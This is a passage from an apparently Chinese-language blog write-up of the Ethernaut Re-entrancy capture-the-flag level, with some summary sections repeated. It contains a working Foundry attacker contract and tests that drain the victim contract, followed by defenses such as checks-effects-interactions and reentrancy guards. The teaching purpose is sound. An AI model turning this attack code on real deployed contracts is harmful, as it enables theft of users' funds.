gas (不足以进行重入)</span><br><span class=\"line\">payable(msg.sender).transfer(amount);</span><br><span class=\"line\"></span><br><span class=\"line\">// call: 转发所有剩余 gas (可能导致重入)</span><br><span class=\"line\">(bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-状态更新时序\"><a href=\"#3-状态更新时序\" class=\"headerlink\" title=\"3. 状态更新时序\"></a>3. 状态更新时序</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 错误模式</span><br><span class=\"line\">function vulnerable() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    externalCall();           // Interaction (危险!)</span><br><span class=\"line\">    updateState();            // Effect (太晚了)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 正确模式</span><br><span class=\"line\">function secure() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    updateState();            // Effect (先更新状态)</span><br><span class=\"line\">    externalCall();           // Interaction (安全)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"The-DAO-攻击-2016年6月\"><a href=\"#The-DAO-攻击-2016年6月\" class=\"headerlink\" title=\"The DAO 攻击 (2016年6月)\"></a>The DAO 攻击 (2016年6月)</h3><ul>\n<li><strong>损失</strong>: 360万 ETH (当时价值约6000万美元)</li>\n<li><strong>原因</strong>: splitDAO 函数存在重入漏洞</li>\n<li><strong>后果</strong>: 以太坊硬分叉，产生 ETH 和 ETC</li>\n<li><strong>教训</strong>: 重入攻击的破坏性和防护重要性</li>\n</ul>\n<h3 id=\"其他著名案例\"><a href=\"#其他著名案例\" class=\"headerlink\" title=\"其他著名案例\"></a>其他著名案例</h3><ol>\n<li><strong>Cream Finance</strong> (2021) - 1.3亿美元损失</li>\n<li><strong>bZx Protocol</strong> (2020) - 多次重入攻击</li>\n<li><strong>Uniswap V1</strong> (早期版本) - 理论漏洞</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>重入攻击是智能合约安全的基石知识：</p>\n<ul>\n<li>✅ <strong>理解 CEI 模式的重要性</strong></li>\n<li>✅ <strong>掌握多种防护措施的使用</strong></li>\n<li>✅ <strong>认识状态管理的关键性</strong></li>\n<li>✅ <strong>学习历史案例的教训</strong></li>\n</ul>\n<p>重入攻击看似简单，但其变种和组合形式在现代 DeFi 协议中仍然是主要威胁。掌握其原理和防护措施是每个智能合约开发者的必修课。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-09-king/\">上一关: Level 9 - King</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">下一关: Level 11 - Elevator</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n<hr>\n<p><em>安全的合约不仅要做正确的事，还要以正确的顺序做事。</em> 🔐</p>\n","more":"<h1 id=\"🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解\"><a href=\"#🎯-Ethernaut-Level-10-Re-entrancy-经典重入攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解\"></a>🎯 Ethernaut Level 10: Re-entrancy - 经典重入攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/10\">Ethernaut Level 10 - Re-entrancy</a><br><strong>攻击类型</strong>: 重入攻击 (Reentrancy Attack)<br><strong>难度</strong>: ⭐⭐⭐⭐☆<br><strong>历史影响</strong>: The DAO 攻击事件 (2016年)</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>这是智能合约安全领域最经典的攻击类型之一：</p>\n<ol>\n<li><strong>窃取合约资金</strong> - 提取超过自己存款金额的以太币</li>\n<li><strong>理解重入原理</strong> - 掌握状态更新时序问题</li>\n<li><strong>学习防护措施</strong> - 了解如何编写安全的提款函数</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.12;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Reentrance &#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  using SafeMath for uint256;</span><br><span class=\"line\">  mapping(address =&gt; uint) public balances;</span><br><span class=\"line\"></span><br><span class=\"line\">  function donate(address _to) public payable &#123;</span><br><span class=\"line\">    balances[_to] = balances[_to].add(msg.value);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class=\"line\">    return balances[_who];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  // 🚨 漏洞函数</span><br><span class=\"line\">  function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">      (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">      if(result) &#123;</span><br><span class=\"line\">        balances[msg.sender] -= _amount;  // ❌ 状态更新在外部调用之后</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p>重入攻击的根本原因是 <strong>检查-效果-交互 (CEI)</strong> 模式的违反：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    // ✅ 检查 (Check)</span><br><span class=\"line\">    if(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ❌ 交互 (Interaction) - 过早进行外部调用</span><br><span class=\"line\">        (bool result,) = msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        if(result) &#123;</span><br><span class=\"line\">            // ❌ 效果 (Effect) - 状态更新太晚</span><br><span class=\"line\">            balances[msg.sender] -= _amount;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><ol>\n<li><strong>恶意合约存款</strong> - 向目标合约存入少量资金</li>\n<li><strong>调用提款函数</strong> - 触发 <code>withdraw()</code> 函数</li>\n<li><strong>接收回调</strong> - 在 <code>call</code> 执行时触发恶意合约的 <code>receive()</code> 函数</li>\n<li><strong>递归调用</strong> - 在状态更新前再次调用 <code>withdraw()</code></li>\n<li><strong>重复提取</strong> - 由于余额未更新，可以多次提取资金</li>\n</ol>\n<h3 id=\"攻击流程图\"><a href=\"#攻击流程图\" class=\"headerlink\" title=\"攻击流程图\"></a>攻击流程图</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">用户调用 withdraw(1 ether)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">检查 balances[attacker] &gt;= 1 ether ✅</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">发送 1 ether 到攻击者合约</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">攻击者合约的 receive() 被触发</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">再次调用 withdraw(1 ether)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">检查 balances[attacker] &gt;= 1 ether ✅ (余额未更新!)</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">再次发送 1 ether...</span><br><span class=\"line\">    ↓</span><br><span class=\"line\">如此重复，直到合约余额耗尽</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击合约代码\"><a href=\"#攻击合约代码\" class=\"headerlink\" title=\"攻击合约代码\"></a>攻击合约代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;../src/Reentrance.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentrancyAttacker &#123;</span><br><span class=\"line\">    Reentrance public target;</span><br><span class=\"line\">    uint public amount;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor(address _target) &#123;</span><br><span class=\"line\">        target = Reentrance(_target);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function attack() external payable &#123;</span><br><span class=\"line\">        amount = msg.value;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤1: 先存入一些资金建立余额</span><br><span class=\"line\">        target.donate&#123;value: amount&#125;(address(this));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 步骤2: 开始重入攻击</span><br><span class=\"line\">        target.withdraw(amount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    // 重入攻击的核心 - receive函数</span><br><span class=\"line\">    receive() external payable &#123;</span><br><span class=\"line\">        if (address(target).balance &gt;= amount) &#123;</span><br><span class=\"line\">            // 递归调用withdraw，实现重入</span><br><span class=\"line\">            target.withdraw(amount);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function getBalance() public view returns (uint) &#123;</span><br><span class=\"line\">        return address(this).balance;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ReentranceTest is Test &#123;</span><br><span class=\"line\">    Reentrance public reentrance;</span><br><span class=\"line\">    ReentrancyAttacker public attacker;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public user1 = makeAddr(&quot;user1&quot;);</span><br><span class=\"line\">    address public user2 = makeAddr(&quot;user2&quot;);</span><br><span class=\"line\">    address public attackerAddr = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署目标合约</span><br><span class=\"line\">        reentrance = new Reentrance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给用户一些初始资金</span><br><span class=\"line\">        vm.deal(user1, 10 ether);</span><br><span class=\"line\">        vm.deal(user2, 10 ether);</span><br><span class=\"line\">        vm.deal(attackerAddr, 2 ether);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 模拟正常用户存款</span><br><span class=\"line\">        vm.prank(user1);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.prank(user2);</span><br><span class=\"line\">        reentrance.donate&#123;value: 5 ether&#125;(user2);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署攻击合约</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker = new ReentrancyAttacker(address(reentrance));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testReentrancyAttack() public &#123;</span><br><span class=\"line\">        uint256 contractBalanceBefore = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceBefore = attackerAddr.balance;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;合约余额 (攻击前):&quot;, contractBalanceBefore);</span><br><span class=\"line\">        console.log(&quot;攻击者余额 (攻击前):&quot;, attackerBalanceBefore);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 执行重入攻击</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        uint256 contractBalanceAfter = address(reentrance).balance;</span><br><span class=\"line\">        uint256 attackerBalanceAfter = attacker.getBalance();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;合约余额 (攻击后):&quot;, contractBalanceAfter);</span><br><span class=\"line\">        console.log(&quot;攻击者余额 (攻击后):&quot;, attackerBalanceAfter);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击成功</span><br><span class=\"line\">        assertEq(contractBalanceAfter, 0);</span><br><span class=\"line\">        assertGt(attackerBalanceAfter, 1 ether); // 获得超过投入的资金</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testReentrancyDetails() public &#123;</span><br><span class=\"line\">        vm.prank(attackerAddr);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 记录每次withdraw调用</span><br><span class=\"line\">        vm.recordLogs();</span><br><span class=\"line\">        attacker.attack&#123;value: 1 ether&#125;();</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证攻击者的余额记录</span><br><span class=\"line\">        assertEq(reentrance.balanceOf(address(attacker)), 0); // 最终余额为0</span><br><span class=\"line\">        assertEq(address(reentrance).balance, 0); // 合约被掏空</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 运行重入攻击测试</span></span><br><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract ReentranceTest -vvv</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输出应该显示合约余额被完全掏空</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-CEI-模式-Check-Effects-Interactions\"><a href=\"#1-CEI-模式-Check-Effects-Interactions\" class=\"headerlink\" title=\"1. CEI 模式 (Check-Effects-Interactions)\"></a>1. CEI 模式 (Check-Effects-Interactions)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SecureReentrance &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">        // ✅ 检查 (Check)</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 效果 (Effect) - 先更新状态</span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        </span><br><span class=\"line\">        // ✅ 交互 (Interaction) - 最后进行外部调用</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-重入锁-Reentrancy-Guard\"><a href=\"#2-重入锁-Reentrancy-Guard\" class=\"headerlink\" title=\"2. 重入锁 (Reentrancy Guard)\"></a>2. 重入锁 (Reentrancy Guard)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ReentrancyGuarded &#123;</span><br><span class=\"line\">    bool private locked;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier noReentrant() &#123;</span><br><span class=\"line\">        require(!locked, &quot;Reentrant call&quot;);</span><br><span class=\"line\">        locked = true;</span><br><span class=\"line\">        _;</span><br><span class=\"line\">        locked = false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public noReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-使用-OpenZeppelin-的-ReentrancyGuard\"><a href=\"#3-使用-OpenZeppelin-的-ReentrancyGuard\" class=\"headerlink\" title=\"3. 使用 OpenZeppelin 的 ReentrancyGuard\"></a>3. 使用 OpenZeppelin 的 ReentrancyGuard</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeContract is ReentrancyGuard &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function withdraw(uint _amount) public nonReentrant &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _amount;</span><br><span class=\"line\">        (bool success,) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class=\"line\">        require(success, &quot;Transfer failed&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-使用-transfer-而非-call\"><a href=\"#4-使用-transfer-而非-call\" class=\"headerlink\" title=\"4. 使用 transfer() 而非 call()\"></a>4. 使用 transfer() 而非 call()</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ⚠️ 有限防护（不推荐作为唯一防护措施）</span><br><span class=\"line\">function withdraw(uint _amount) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _amount, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _amount;</span><br><span class=\"line\">    payable(msg.sender).transfer(_amount); // 限制 Gas 为 2300</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"1-重入攻击类型\"><a href=\"#1-重入攻击类型\" class=\"headerlink\" title=\"1. 重入攻击类型\"></a>1. 重入攻击类型</h3><table>\n<thead>\n<tr>\n<th>类型</th>\n<th>描述</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>单函数重入</strong></td>\n<td>攻击同一个函数</td>\n<td>本关卡的 <code>withdraw()</code></td>\n</tr>\n<tr>\n<td><strong>跨函数重入</strong></td>\n<td>攻击不同函数</td>\n<td><code>withdraw()</code> → <code>transfer()</code></td>\n</tr>\n<tr>\n<td><strong>跨合约重入</strong></td>\n<td>攻击不同合约</td>\n<td>DeFi 协议间的复杂重入</td>\n</tr>\n</tbody></table>\n<h3 id=\"2-Gas-限制对比\"><a href=\"#2-Gas-限制对比\" class=\"headerlink\" title=\"2. Gas 限制对比\"></a>2. Gas 限制对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// transfer/send: 2300 gas (不足以进行重入)</span><br><span class=\"line\">payable(msg.sender).transfer(amount);</span><br><span class=\"line\"></span><br><span class=\"line\">// call: 转发所有剩余 gas (可能导致重入)</span><br><span class=\"line\">(bool success,) = msg.sender.call&#123;value: amount&#125;(&quot;&quot;);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-状态更新时序\"><a href=\"#3-状态更新时序\" class=\"headerlink\" title=\"3. 状态更新时序\"></a>3. 状态更新时序</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ❌ 错误模式</span><br><span class=\"line\">function vulnerable() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    externalCall();           // Interaction (危险!)</span><br><span class=\"line\">    updateState();            // Effect (太晚了)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 正确模式</span><br><span class=\"line\">function secure() public &#123;</span><br><span class=\"line\">    require(condition);        // Check</span><br><span class=\"line\">    updateState();            // Effect (先更新状态)</span><br><span class=\"line\">    externalCall();           // Interaction (安全)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"The-DAO-攻击-2016年6月\"><a href=\"#The-DAO-攻击-2016年6月\" class=\"headerlink\" title=\"The DAO 攻击 (2016年6月)\"></a>The DAO 攻击 (2016年6月)</h3><ul>\n<li><strong>损失</strong>: 360万 ETH (当时价值约6000万美元)</li>\n<li><strong>原因</strong>: splitDAO 函数存在重入漏洞</li>\n<li><strong>后果</strong>: 以太坊硬分叉，产生 ETH 和 ETC</li>\n<li><strong>教训</strong>: 重入攻击的破坏性和防护重要性</li>\n</ul>\n<h3 id=\"其他著名案例\"><a 